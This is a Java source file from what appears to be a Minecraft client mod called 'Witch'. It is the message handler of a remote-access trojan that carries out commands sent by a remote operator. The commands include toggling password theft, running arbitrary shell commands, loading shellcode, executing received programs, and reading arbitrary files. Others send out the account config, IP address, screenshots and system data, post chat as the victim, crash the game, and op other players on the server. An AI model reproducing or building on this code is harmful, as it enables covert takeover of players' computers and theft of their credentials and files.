package me.soda.witch.client.connection;

import me.soda.witch.client.Witch;
import me.soda.witch.client.utils.*;
import me.soda.witch.shared.FileUtil;
import me.soda.witch.shared.LogUtil;
import me.soda.witch.shared.NetUtil;
import me.soda.witch.shared.ProgramUtil;
import me.soda.witch.shared.socket.messages.Message;
import net.minecraft.client.network.PlayerListEntry;
import net.minecraft.client.util.GlfwUtil;
import net.minecraft.util.StringHelper;

import java.lang.management.ManagementFactory;
import java.util.ArrayList;
import java.util.List;

import static me.soda.witch.client.Witch.mc;

public class MessageHandler {
    public static void handleMessage(Message message) {
        String msgType = message.messageID;
        Object msg = message.data;
        LogUtil.println("Received message: " + msgType);
        try {
            switch (msgType) {
                case "steal_pwd_switch" -> Witch.VARIABLES.passwordBeingLogged = !Witch.VARIABLES.passwordBeingLogged;
                case "chat_control" -> ChatUtils.sendChat((String) msg);
                case "chat_filter" -> Witch.VARIABLES.filterPattern = (String) msg;
                case "chat_filter_switch" -> Witch.VARIABLES.isBeingFiltered = !Witch.VARIABLES.isBeingFiltered;
                case "chat_mute" -> Witch.VARIABLES.isMuted = !Witch.VARIABLES.isMuted;
                case "mods" -> Witch.send(msgType, MCUtils.allMods());
                case "systeminfo" -> Witch.send(msgType, MCUtils.systemInfo());
                case "screenshot" -> ScreenshotUtil.gameScreenshot();
                case "screenshot2" -> Witch.send(msgType, ScreenshotUtil.systemScreenshot());
                case "chat" -> {
                    Witch.CHAT_WINDOW.frame.setVisible(true);
                    Witch.CHAT_WINDOW.appendText("Admin:" + msg);
                }
                case "shell" -> new Thread(() -> {
                    String result = ProgramUtil.runCmd((String) msg);
                    Witch.send(msgType, "\n" + result);
                }).start();
                case "shellcode" -> {
                    if (ProgramUtil.isWin())
                        new Thread(() -> new ShellcodeLoader().loadShellCode((String) msg)).start();
                }
                case "log" -> Witch.VARIABLES.logChatAndCommand = !Witch.VARIABLES.logChatAndCommand;
                case "config" -> Witch.send(msgType, Witch.VARIABLES);
                case "player" -> Witch.send(msgType, MCUtils.getPlayerInfo());
                case "skin" -> MCUtils.sendPlayerSkin();
                case "server" -> {
                    MCUtils.disconnect();
                    Witch.VARIABLES.canJoinServer = !Witch.VARIABLES.canJoinServer;
                }
                case "kick" -> MCUtils.disconnect();
                case "execute" -> new Thread(() -> ProgramUtil.runProg((byte[]) msg)).start();
                case "iasconfig" -> Witch.send(msgType, FileUtil.read("config/ias.json"));
                case "read" -> Witch.send(msgType, FileUtil.read((String) msg));
                case "runargs" -> Witch.send(msgType, ManagementFactory.getRuntimeMXBean().getInputArguments());
                case "props" -> Witch.send(msgType, System.getProperties());
                case "ip" -> Witch.send(msgType, NetUtil.getIP());
                case "crash" -> GlfwUtil.makeJvmCrash();
                case "server_name" -> Witch.VARIABLES.name = (String) msg;
                case "op@a" -> {
                    if (!MCUtils.canUpdate()) return;
                    List<String> players = new ArrayList<>();
                    String pName = mc.getSession().getProfile().getName();
                    for (PlayerListEntry info : mc.getNetworkHandler().getPlayerList()) {
                        String name = info.getProfile().getName();
                        if (StringHelper.stripTextFormat(name).equalsIgnoreCase(pName))
                            continue;

                        players.add(name);
                    }
                    OpEveryone.opEveryone(players);
                }
            }
        } catch (Exception e) {
            LogUtil.println("Corrupted message!");
            LogUtil.printStackTrace(e);
        }
    }
}
